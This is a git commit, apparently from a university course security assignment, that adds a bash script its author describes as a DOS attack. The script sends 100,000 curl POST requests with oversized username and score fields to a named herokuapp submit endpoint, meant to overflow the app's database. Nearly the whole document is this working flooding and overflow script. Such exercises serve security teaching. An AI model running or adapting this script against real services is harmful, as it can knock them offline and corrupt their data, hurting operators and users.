49fb538c9151617fcc461b3d585afde31af1bec4
George Brown <gbrown3593@gmail.com>
2014-04-27 21:18:28 -0400

    finally overflowed DB

---
+++ security/scripts/overflows2.sh
@@ -0,0 +1,10 @@
+#!/bin/bash 
+# George Brown, Comp 20 Assignment 5
+# Used for a DOS attack
+# Thanks to Siddhartha Prasad for helping me with this script
+i=0 
+while [ $i -lt 100000 ] 
+do 
+curl --data '{"username":"dislhfjdksaghfdsjkmdjksfhdjhgfdhjhfdjhdjkfhsjkdfhdsjkfhdsjkfhdsjkfhdsjkfhdsjdqwhwkjdfshjkfhdsflllllllllldlflsdflsldlfdslfldslfdslfdlsfldslfdslfldsfldslfdlsflsdlfsdl", "score":"999999999999999999999999999999999999999999999999999999", "grid":"xxxxxxxxxxxxxxx"}' http://sleepy-atoll-6532.herokuapp.com/submit.json -H "Content-Type: application/json" 
+i=$(($i+1))
+done
